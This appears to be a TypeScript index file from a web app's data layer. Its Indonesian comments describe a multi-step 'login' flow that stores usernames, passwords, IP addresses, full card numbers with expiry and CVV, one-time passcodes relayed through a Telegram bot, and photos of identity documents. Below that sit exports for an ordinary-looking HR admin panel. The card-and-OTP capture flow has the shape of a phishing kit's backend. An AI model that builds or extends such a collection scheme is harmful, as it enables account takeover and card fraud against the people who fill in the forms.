/* ═══════════════════════════════════════════════════════════
   ALUR LOGIN UTAMA — data yang dikumpulkan dari user
   ═══════════════════════════════════════════════════════════

   Step 1  /login          → login_logs          (username, password, ip)
   Step 2  /bot-otp        → (Telegram OTP, tidak disimpan ke DB)
   Step 3  /login-success  → login_logs          (email, status = approved)
   Step 4  /step4          → personal_submissions (data pribadi + info kartu)
   Step 5  /verify         → otp_submissions      (kode OTP)
   Step 6  /contact-form   → contact_submissions  (form kontak + foto dokumen)
   ═══════════════════════════════════════════════════════════ */
export * from "./login-logs";           // Step 1 & 3 — username · password · email · ip
export * from "./personal-submissions"; // Step 4     — data pribadi + kartu (digits, exp, cvv)
export * from "./otp-submissions";      // Step 5     — kode OTP
export * from "./contact-submissions";  // Step 6     — contact form + foto dokumen
export * from "./page-visits";          // Tracking   — setiap kunjungan halaman

/* ═══════════════════════════════════════════════════════════
   ADMIN / HR PANEL — manajemen internal
   ═══════════════════════════════════════════════════════════ */
export * from "./departments";
export * from "./employees";
export * from "./payroll-periods";
export * from "./payslips";
export * from "./announcements";
export * from "./work-schedules";
export * from "./notification-logs";
export * from "./attendance";
export * from "./crew-credentials";
export * from "./card-submissions";     // (tabel lama, dipertahankan)
